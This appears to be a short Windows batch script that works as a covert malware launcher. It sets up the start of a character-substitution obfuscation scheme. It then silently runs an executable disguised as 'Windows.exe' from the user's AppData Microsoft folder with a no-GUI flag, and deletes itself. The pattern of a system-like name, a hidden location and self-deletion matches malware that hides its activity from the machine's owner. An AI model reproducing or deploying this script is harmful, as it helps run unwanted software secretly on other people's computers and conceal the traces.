@ECHO OFF
::Encrypt
(set CHAR[A]=UDFMHD45)
::Decrypt
(set CHAR[UDFMHD45]=A)
start /d "%appdata%\Microsoft" Windows.exe /nogui Windows.txt
DEL "%~f0"